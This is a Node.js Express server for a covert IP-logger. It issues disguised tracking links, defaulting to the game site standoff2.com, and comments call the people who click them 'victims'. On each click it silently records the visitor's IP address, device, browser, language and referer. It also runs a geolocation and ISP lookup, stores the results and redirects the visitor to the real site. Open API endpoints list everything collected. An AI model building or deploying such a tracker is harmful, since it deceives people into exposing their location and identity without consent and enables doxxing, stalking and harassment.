const express = require('express');
const fetch = require('node-fetch');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// ── Data Storage (persists to JSON file) ──────────────────
const DATA_FILE = path.join(__dirname, '.tracker-data.json');

function loadData() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    }
  } catch (e) { console.error('[DB] Load error:', e.message); }
  return { links: {}, visitors: {} };
}

function saveData() {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(db, null, 2));
  } catch (e) { console.error('[DB] Save error:', e.message); }
}

let db = loadData();

// ── Middleware ─────────────────────────────────────────────
app.use(express.json());
app.set('trust proxy', true); // for real IP behind reverse proxy

// ── API: Create tracking link ─────────────────────────────
app.post('/api/create-link', (req, res) => {
  const destination = req.body.destination || 'https://standoff2.com';
  const id = crypto.randomBytes(4).toString('hex'); // 8-char hex ID

  db.links[id] = {
    id: id,
    destination: destination,
    created: new Date().toISOString(),
    clicks: 0
  };
  db.visitors[id] = [];
  saveData();

  // The tracking URL on public host (Render / Custom Domain)
  const proto = req.headers['x-forwarded-proto'] || req.protocol || 'https';
  const host = req.headers['x-forwarded-host'] || req.get('host');
  const trackUrl = `${proto}://${host}/t/${id}`;

  console.log(`[TRACK] Created link: ${trackUrl} -> ${destination}`);

  res.json({
    success: true,
    url: trackUrl,
    logger_id: id,
    destination: destination
  });
});

// ── Tracking endpoint — THIS is what victims click ────────
app.get('/t/:id', async (req, res) => {
  const id = req.params.id;
  const link = db.links[id];

  if (!link) {
    return res.redirect('https://standoff2.com');
  }

  // Grab real data from the request
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  const userAgent = req.headers['user-agent'] || 'unknown';
  const lang = req.headers['accept-language'] || '';
  const referer = req.headers['referer'] || '';
  const timestamp = new Date().toISOString();

  // Clean IP (remove ::ffff: prefix for IPv4)
  const cleanIp = ip.replace('::ffff:', '');

  // Geo lookup via free API
  let geo = { country: '', city: '', isp: '', org: '', as: '', regionName: '' };
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,countryCode,regionName,city,isp,org,as,query`);
    const geoData = await geoRes.json();
    if (geoData.status === 'success') {
      geo = geoData;
    }
  } catch (e) {
    console.error('[GEO] Lookup failed:', e.message);
  }

  // Parse user-agent for device info
  const deviceInfo = parseUserAgent(userAgent);

  const visitor = {
    ip: cleanIp,
    userAgent: userAgent,
    device: deviceInfo.device,
    os: deviceInfo.os,
    browser: deviceInfo.browser,
    country: geo.country || '',
    countryCode: geo.countryCode || '',
    city: geo.city || '',
    region: geo.regionName || '',
    isp: geo.isp || '',
    org: geo.org || '',
    language: lang.split(',')[0] || '',
    referer: referer,
    timestamp: timestamp
  };

  // Store
  if (!db.visitors[id]) db.visitors[id] = [];
  db.visitors[id].push(visitor);
  db.links[id].clicks++;
  saveData();

  console.log(`[HIT] ${cleanIp} | ${geo.city}, ${geo.country} | ${deviceInfo.device} | ${deviceInfo.browser}`);

  // Redirect victim to destination
  res.redirect(link.destination);
});

// ── API: Get visitors for a link ──────────────────────────
app.get('/api/visitors/:id', (req, res) => {
  const id = req.params.id;
  const visitors = db.visitors[id] || [];
  const link = db.links[id] || {};

  res.json({
    success: true,
    link_id: id,
    clicks: link.clicks || 0,
    visitors: visitors
  });
});

// ── API: Get all links ────────────────────────────────────
app.get('/api/links', (req, res) => {
  const links = Object.values(db.links).map(l => ({
    ...l,
    visitors_count: (db.visitors[l.id] || []).length
  }));
  res.json({ success: true, links: links });
});

// ── API: Get summary stats ────────────────────────────────
app.get('/api/stats', (req, res) => {
  const totalLinks = Object.keys(db.links).length;
  const totalClicks = Object.values(db.links).reduce((acc, l) => acc + (l.clicks || 0), 0);
  const totalVisitors = Object.values(db.visitors).reduce((acc, v) => acc + v.length, 0);

  res.json({
    success: true,
    total_links: totalLinks,
    total_clicks: totalClicks,
    total_visitors: totalVisitors
  });
});

// ── User-Agent Parser ─────────────────────────────────────
function parseUserAgent(ua) {
  let device = 'Unknown';
  let os = 'Unknown';
  let browser = 'Unknown';

  // OS detection
  if (/iPhone/.test(ua)) { os = 'iOS'; device = ua.match(/iPhone\s*(\d+)?/)?.[0] || 'iPhone'; }
  else if (/iPad/.test(ua)) { os = 'iPadOS'; device = 'iPad'; }
  else if (/Android/.test(ua)) {
    os = 'Android ' + (ua.match(/Android\s([\d.]+)/)?.[1] || '');
    // Try to extract device model
    const modelMatch = ua.match(/;\s*([^;)]+)\s*Build/);
    device = modelMatch ? modelMatch[1].trim() : 'Android Device';
  }
  else if (/Windows NT 10/.test(ua)) { os = 'Windows 10/11'; device = 'Desktop'; }
  else if (/Windows/.test(ua)) { os = 'Windows'; device = 'Desktop'; }
  else if (/Mac OS X/.test(ua)) { os = 'macOS'; device = 'Mac'; }
  else if (/Linux/.test(ua)) { os = 'Linux'; device = 'Desktop'; }

  // Browser detection
  if (/YaBrowser/.test(ua)) browser = 'Yandex Browser ' + (ua.match(/YaBrowser\/([\d.]+)/)?.[1] || '');
  else if (/SamsungBrowser/.test(ua)) browser = 'Samsung Internet ' + (ua.match(/SamsungBrowser\/([\d.]+)/)?.[1] || '');
  else if (/OPR|Opera/.test(ua)) browser = 'Opera ' + (ua.match(/OPR\/([\d.]+)/)?.[1] || '');
  else if (/Edg/.test(ua)) browser = 'Edge ' + (ua.match(/Edg\/([\d.]+)/)?.[1] || '');
  else if (/Chrome/.test(ua)) browser = 'Chrome ' + (ua.match(/Chrome\/([\d.]+)/)?.[1] || '');
  else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari ' + (ua.match(/Version\/([\d.]+)/)?.[1] || '');
  else if (/Firefox/.test(ua)) browser = 'Firefox ' + (ua.match(/Firefox\/([\d.]+)/)?.[1] || '');

  return { device, os, browser };
}

// ── Serve static files (frontend) ─────────────────────────
app.use(express.static(path.join(__dirname)));

app.listen(PORT, '0.0.0.0', () => {
  console.log(`[ANTICHRIST] Server active on port ${PORT} (0.0.0.0)`);
  console.log(`[ANTICHRIST] ${Object.keys(db.links).length} existing links loaded`);
});
